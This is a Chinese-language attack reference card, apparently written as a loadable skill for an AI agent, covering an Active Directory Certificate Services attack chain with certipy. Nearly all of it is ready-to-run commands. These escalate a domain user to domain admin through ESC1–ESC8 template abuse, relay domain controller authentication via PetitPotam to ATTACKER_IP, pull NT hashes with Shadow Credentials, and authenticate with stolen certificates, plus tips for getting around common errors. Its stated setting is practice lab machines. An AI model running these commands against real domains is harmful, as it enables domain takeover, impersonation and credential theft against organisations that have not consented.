---
name: 'adcs-attack-chain'
description: 'ADCS 全攻击链：certipy find→ESC1-8→Shadow Credentials→证书窃取→PKINITtools。每条 ESC 的实战命令和常见坑。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。

# ADCS 攻击全链 — Certipy 实战参考

## 快速命令速查

### 枚举
```bash
certipy find -u 'user@domain' -p 'pass' -dc-ip 10.0.0.100 -stdout -enabled -vulnerable -hide-admins
```text

### ESC1 (SAN 指定 → 冒充任何用户)
```bash
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA.dom' -ca 'CA-NAME' -template 'TPL' -upn 'admin@dom' -sid S-1-5-21-...-500
certipy auth -pfx 'admin.pfx' -dc-ip IP
```text

### ESC2/3 (Any Purpose / Enrollment Agent)
```bash
# 先拿 Enrollment Agent 证书
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'RA-TEMPLATE'
# 代理请求其他用户
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'User' -on-behalf-of 'DOM\admin' -pfx 'a.pfx'
certipy auth -pfx 'admin.pfx' -dc-ip IP
```text

### ESC4 (模板 ACL 可写 → 改成 ESC1 然后打)
```bash
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -save-configuration orig.json
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -write-default-configuration
# ... ESC1 exploit ...
certipy template -template 'TPL' -u 'a@d' -p 'p' -dc-ip IP -write-configuration orig.json
```text

### ESC6 (CA 级 SAN 标志 — 所有模板可用)
```bash
certipy req -u 'a@d' -p 'p' -dc-ip IP -target 'CA' -ca 'CA-NAME' -template 'User' -upn 'admin@dom' -sid S-...-500
certipy auth -pfx 'admin.pfx' -dc-ip IP
```text

### ESC8 (NTLM Relay → AD CS HTTP)
```bash
# 终端1: 启动 relay
certipy relay -target 'http://CA.DOM' -ca 'CA-NAME' -template 'DomainController' -interface 0.0.0.0
# 终端2: 强制认证
python3 PetitPotam.py -d domain -u 'user' -p 'pass' 'ATTACKER_IP' 'DC01.domain'
# 终端1 收到 DC$ 证书 → auth
certipy auth -pfx 'dc01.pfx' -dc-ip IP -username 'DC01$' -domain 'domain'
```text

### Shadow Credentials (GenericWrite → 直接拿 hash)
```bash
certipy shadow auto -u 'a@d' -p 'p' -dc-ip IP -account 'target'
# 输出: NT hash for 'target': xxxx
```text

### 证书窃取 (THEFT)
```bash
certipy auth -pfx 'stolen.pfx' -dc-ip IP -username 'victim' -domain 'dom'
# 或用 PKINITtools: gettgtpkinit.py → getnthash.py (需要 -key)
```text

## 常见坑
1. **"no object SID"** → 加 `-username victim -domain dom`
2. **KDC_CLIENT_NOT_TRUSTED** → 加 `-crl 'ldap:///'` 
3. **Clock skew** → `ntpdate -b DC_IP`
4. **-target 必须匹配 CA DNS 名**
5. **Web Enrollment relay 需要 EPA/Channel Binding 禁用**

## Certipy 版本功能
- v4+ → shadow, template, relay, account
- v5+ → ESC9-16, -forever, parse, 改进 cleanup

**Why:** ADCS 是我 7 个已完成 Windows/AD 靶机的最大盲区，一次都没实战过。ESC1-8 是最常见的 AD 提权路径。
**How to apply:** AD 靶机拿到域用户后，第一件事跑 `certipy find -vulnerable`。
